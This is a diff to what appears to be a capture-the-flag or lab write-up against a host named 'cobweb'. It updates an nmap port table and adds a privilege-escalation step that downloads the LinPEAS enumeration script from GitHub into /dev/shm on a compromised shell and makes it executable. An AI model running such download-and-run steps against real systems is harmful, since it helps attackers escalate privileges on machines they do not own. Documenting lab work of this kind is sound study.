@@ -13,13 +13,13 @@
 
 We run `nmap -sS -sV cobweb`.
 
-| port | service      | notes |
-| ---- | ------------ | ----- |
-| 21   | vsftpd 3.0.3 |       |
-| 22   | openssh      |       |
-| 80   | httpd        |       |
-| 3306 | mysql        |       |
-| 9090 | zeus-admin   |       |
+| port | service      | notes  |
+| ---- | ------------ | ------ |
+| 21   | vsftpd 3.0.3 |        |
+| 22   | openssh      |        |
+| 80   | httpd        |        |
+| 3306 | mysql        |        |
+| 9090 | zeus-admin   | closed |
 Let's run `gobuster`.
 
 ```sh
@@ -414,4 +414,12 @@ I'm re-reading the description of the lab for clues.
 SUID `screen` binary...Dang.
 
 If our shell is unstable, `screen` dies. I might want to research how to stabilize it later, tomorrow morning.
+
+Let's try LinPEAS.
+
+```sh
+cd /dev/shm
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20260422-9567fd62/linpeas.sh
+chmod +x linpeas.sh
+```
 ## Root access
